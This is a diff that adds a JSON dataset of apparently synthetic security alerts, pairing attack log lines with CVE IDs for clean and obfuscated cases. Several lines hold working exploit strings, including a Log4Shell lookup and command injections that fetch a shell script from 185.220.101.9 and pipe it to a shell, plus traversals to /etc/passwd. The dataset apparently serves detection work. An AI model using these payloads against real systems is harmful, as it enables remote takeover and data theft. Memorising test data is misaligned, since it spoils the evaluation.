@@ -1,0 +1,522 @@
+[
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"POST /api/v1/auth HTTP/1.1\" 500 1244 \"-\" \"${jndi:ldap://185.220.101.9:1389/Basic/Command/Base64/Y3VybCBodHRwOi8vMTg1LjIyMC4xMDEuOS9zaGVsbC5zaCB8IGJhc2g=}\"",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP",
+                "srcip": "185.220.101.9",
+                "id": "500",
+                "url": "/api/v1/auth"
+            },
+            "location": "/var/log/nginx/access.log"
+        },
+        "mapped_cve": "CVE-2021-44228",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "{\"timestamp\":\"2026-06-16T10:30:00.000000+0000\",\"event_type\":\"alert\",\"src_ip\":\"185.220.101.9\",\"dest_ip\":\"172.16.5.10\",\"proto\":\"TCP\",\"alert\":{\"signature\":\"ET EXPLOIT MS17-010 SMBv1 FEA List Overflow\",\"severity\":1},\"payload\":\"\\\\xffSMB\\\\x32\\\\x00\\\\x00\\\\x00\\\\x00[...TRUNCATED_PAYLOAD...]\"}",
+            "decoder": {
+                "name": "json"
+            },
+            "data": {
+                "protocol": "TCP",
+                "srcip": "185.220.101.9",
+                "id": "2024218",
+                "url": "srv.sys"
+            },
+            "location": "/var/log/suricata/eve.json"
+        },
+        "mapped_cve": "CVE-2017-0144",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"POST /global-protect/login.esp HTTP/1.1\" 200 54 \"-\" \"curl/7.81.0\" \"SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/cmd=\\`curl 185.220.101.9/x|sh\\`\"",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/global-protect/login.esp"
+            },
+            "location": "/var/log/nginx/sslgpw_access.log"
+        },
+        "mapped_cve": "CVE-2024-3400",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "type=SYSCALL msg=audit(1718533800.441:982): arch=c000003e syscall=1 success=yes exit=4096 a0=4 a1=7f8e9a20 a2=1000 a3=0 items=0 ppid=882 pid=1042 auid=1001 uid=1001 gid=1001 euid=1001 comm=\"sh\" exe=\"/usr/bin/sh\" payload=0x524f4f543a583a30[...]TRUNCATED_PAYLOAD...",
+            "decoder": {
+                "name": "auditd"
+            },
+            "data": {
+                "protocol": "SYSCALL",
+                "srcip": "185.220.101.9",
+                "id": "1",
+                "url": "/usr/bin/sh"
+            },
+            "location": "/var/log/audit/audit.log"
+        },
+        "mapped_cve": "CVE-2022-0847",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"POST /psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet?action=exec&cmd=id HTTP/1.1\" 200 2048 \"-\" \"python-requests/2.31.0\" \"payload=\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48[...TRUNCATED_PAYLOAD...]\"",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet"
+            },
+            "location": "/u01/app/oracle/config/domains/peoplesoft/servers/PIA/logs/access.log"
+        },
+        "mapped_cve": "CVE-2026-35273",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "Jun 16 10:30:00 DC-PROD-01 Microsoft-Windows-Netlogon[5805]: The Netlogon service failed to authenticate the connection from the remote computer ATTACK-STATION. The following error occurred: Access is denied. Client Credential: 0000000000000000[...TRUNCATED_PAYLOAD...] NegotiationFlags: 0x212fffff",
+            "decoder": {
+                "name": "windows"
+            },
+            "data": {
+                "protocol": "MS-NRPC",
+                "srcip": "185.220.101.9",
+                "id": "5805",
+                "url": "lsass.exe/netlogon"
+            },
+            "location": "C:\\Windows\\System32\\Winevt\\Logs\\System.evtx"
+        },
+        "mapped_cve": "CVE-2020-1472",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\" 200 1042 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP/1.1",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd"
+            },
+            "location": "/var/log/pulsesecure/access.log"
+        },
+        "mapped_cve": "CVE-2019-11510",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "type=EXECVE msg=audit(1718533800.000:982): argc=4 a0=\"sudoedit\" a1=\"-s\" a2=\"\\\\\" a3=\"AAAAAAAAAAAAAAAAAAAA[...TRUNCATED_PAYLOAD...]\" ppid=1024 pid=2045 auid=1000 uid=1000 euid=0 comm=\"sudoedit\" exe=\"/usr/bin/sudo\"",
+            "decoder": {
+                "name": "auditd"
+            },
+            "data": {
+                "protocol": "SYSCALL",
+                "srcip": "185.220.101.9",
+                "id": "59",
+                "url": "/usr/bin/sudo"
+            },
+            "location": "/var/log/audit/audit.log"
+        },
+        "mapped_cve": "CVE-2021-3156",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"curl http://185.220.101.9/bin.sh[...TRUNCATED_PAYLOAD...]\");'); HTTP/1.1\" 200 1244",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP/1.1",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/console/images/%252E%252E%252Fconsole.portal"
+            },
+            "location": "/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log"
+        },
+        "mapped_cve": "CVE-2020-14882",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:30:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Critical security event: Anomalous behavior or exploit payload detected by system monitoring.",
+                "id": "100200",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "security_event",
+                    "mitre_t1190"
+                ]
+            },
+            "agent": {
+                "id": "010",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.10"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \"GET /cgi-bin/status.cgi HTTP/1.1\" 200 512 \"-\" \"() { :; }; /bin/ba [...TRUNCATED_PAYLOAD...]\"",
+            "decoder": {
+                "name": "web-accesslog"
+            },
+            "data": {
+                "protocol": "HTTP",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/cgi-bin/status.cgi"
+            },
+            "location": "/var/log/apache2/access.log"
+        },
+        "mapped_cve": "CVE-2014-6271",
+        "tipo_dataset": "limpio"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:32:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Suspicious activity: Evasion technique or obfuscated exploit attempt identified.",
+                "id": "100300",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "evasion"
+                ]
+            },
+            "agent": {
+                "id": "011",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.11"
+            },
+            "full_log": "2026-06-16 10:32:00 172.16.5.11 POST /owa/auth/logon.aspx - 443 - 185.220.101.9 Mozilla/5.0 - 200 0 0 15 Cookie:X-BEResource=~%31%32%37%2e%30%2e%30%2e%31%2f%65%63%70%2f%70%72%6f%78%79%4c%6f%67%6f%6e[...TRUNCATED_PAYLOAD...]",
+            "decoder": {
+                "name": "web-accesslog-iis"
+            },
+            "data": {
+                "protocol": "HTTPS",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/owa/auth/logon.aspx"
+            },
+            "location": "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex260616.log"
+        },
+        "mapped_cve": "CVE-2021-26855",
+        "tipo_dataset": "ofuscado"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:32:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Suspicious activity: Evasion technique or obfuscated exploit attempt identified.",
+                "id": "100300",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "evasion"
+                ]
+            },
+            "agent": {
+                "id": "011",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.11"
+            },
+            "full_log": "type=EXECVE msg=audit(1718533920.444:99): argc=0 ppid=882 pid=901 auid=1001 uid=1001 euid=0 exe=\"/tmp/. \\x1b/p\" envp=\\x47\\x43\\x4f\\x4e\\x56\\x5f\\x50\\x41\\x54\\x48\\x3d\\x2e\\x00[...TRUNCATED_PAYLOAD...]",
+            "decoder": {
+                "name": "auditd"
+            },
+            "data": {
+                "protocol": "local-exec",
+                "srcip": "185.220.101.9",
+                "id": "SYSCALL_59",
+                "url": "/tmp/. \\x1b/p"
+            },
+            "location": "/var/log/audit/audit.log"
+        },
+        "mapped_cve": "CVE-2021-4034",
+        "tipo_dataset": "ofuscado"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:32:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Suspicious activity: Evasion technique or obfuscated exploit attempt identified.",
+                "id": "100300",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "evasion"
+                ]
+            },
+            "agent": {
+                "id": "011",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.11"
+            },
+            "full_log": "2026-06-16 10:32:00,000 ERROR JakartaMultiPartRequest:44 - Invalid Content-Type: %{(#\\u0027\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u0061\\u0072\\u0074\\u002f\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u0027).(#\\u0064\\u006d\\u003d[...TRUNCATED_PAYLOAD...]",
+            "decoder": {
+                "name": "apache-struts-jakarta-parser"
+            },
+            "data": {
+                "protocol": "HTTP/1.1",
+                "srcip": "185.220.101.9",
+                "id": "500",
+                "url": "/struts2-rest-showcase/orders/3.xhtml"
+            },
+            "location": "/var/log/tomcat8/catalina.out"
+        },
+        "mapped_cve": "CVE-2017-5638",
+        "tipo_dataset": "ofuscado"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:32:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Suspicious activity: Evasion technique or obfuscated exploit attempt identified.",
+                "id": "100300",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "evasion"
+                ]
+            },
+            "agent": {
+                "id": "011",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.11"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:32:00 +0000] \"POST /vpn/%2e%2e/%76%70%6e%73/portal/scripts/new_p.pl HTTP/1.1\" 200 143 \"NSC_USER: %2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64\" \"NSC_EPOC: \\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41[...TRUNCATED_PAYLOAD...]\"",
+            "decoder": {
+                "name": "citrix-adc-access"
+            },
+            "data": {
+                "protocol": "HTTPS",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/vpn/%2e%2e/%76%70%6e%73/portal/scripts/new_p.pl"
+            },
+            "location": "/var/log/httpd.log"
+        },
+        "mapped_cve": "CVE-2019-19781",
+        "tipo_dataset": "ofuscado"
+    },
+    {
+        "original_alert": {
+            "timestamp": "2026-06-16T10:32:00.000+0000",
+            "rule": {
+                "level": 12,
+                "description": "Suspicious activity: Evasion technique or obfuscated exploit attempt identified.",
+                "id": "100300",
+                "firedtimes": 1,
+                "mail": true,
+                "groups": [
+                    "attack",
+                    "evasion"
+                ]
+            },
+            "agent": {
+                "id": "011",
+                "name": "core-infrastructure-node",
+                "ip": "172.16.5.11"
+            },
+            "full_log": "185.220.101.9 - - [16/Jun/2026:10:32:00 +0000] \"POST /%73%65%74%75%70/%2e%2e/%73%65%74%75%70/%73%65%74%75%70%61%64%6d%69%6e%69%73%74%72%61%74%6f%72.action HTTP/1.1\" 200 4512 \"-\" \"Mozilla/5.0\" payload=\\x75\\x73\\x65\\x72\\x6e\\x61\\x6d\\x65\\x3d\\x61\\x64\\x6d\\x69\\x6e\\x26\\x70[...TRUNCATED_PAYLOAD...]",
+            "decoder": {
+                "name": "web-accesslog-confluence"
+            },
+            "data": {
+                "protocol": "POST",
+                "srcip": "185.220.101.9",
+                "id": "200",
+                "url": "/%73%65%74%75%70/%2e%2e/%73%65%74%75%70/%73%65%74%75%70%61%64%6d%69%6e%69%73%74%72%61%74%6f%72.action"
+            },
+            "location": "/var/atlassian/application-data/confluence/logs/access_log.2026-06-16"
+        },
+        "mapped_cve": "CVE-2023-22515",
+        "tipo_dataset": "ofuscado"
+    }
+]
